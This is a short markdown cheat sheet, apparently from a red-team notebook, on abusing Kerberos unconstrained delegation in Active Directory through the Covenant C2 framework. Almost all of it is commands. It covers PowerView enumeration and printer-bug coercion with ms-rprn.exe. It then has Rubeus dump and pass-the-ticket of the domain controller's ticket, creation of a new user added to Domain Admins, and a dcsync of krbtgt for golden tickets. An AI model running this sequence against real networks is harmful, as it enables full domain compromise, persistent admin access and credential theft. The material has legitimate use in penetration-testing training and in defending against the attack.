# Unconstrained Delegation

- This means that the computer is trusted to delegate any service.

## Enumeration

- Here we assume we have a high integrity grunt in Covenant with a computer that has unconstrained delegation, we can check this using this command:
  `powershell get-netcomputer -unconstrained -properties dnshostname`  
  Here is what the result looks like, so we have Workstation-01 that has unconstrained Delegation
  ```
  dnshostname                  
  -----------                  
  DC01.domain.local          
  WORKSTATION-01.domain.local
  ```

## Exploitation

- We upload ms-rprn.exe with the Covenant `upload` command to our target
- We run it `shell ms-rprn.exe \\dc01 \\workstation-01`
- run `rubeus dump /service:krbtgt` here we will want to copy and keep aside the DC01 Base64EncodedTicket
- `maketoken adminsitrator domain type-any-string-here`
- `rubeus ptt /ticket PASTE-HERE-DC01-Base64EncodedTicket`
- We should now be able to create a new user and add it to the Domain Admins
  ```
  shell net user user SafePass1! /add /domain
  shell net group "Domain Admins" user /add /domain
  ```
- `dcsync domain\krbtgt` We will need this if we want to do a golden ticket
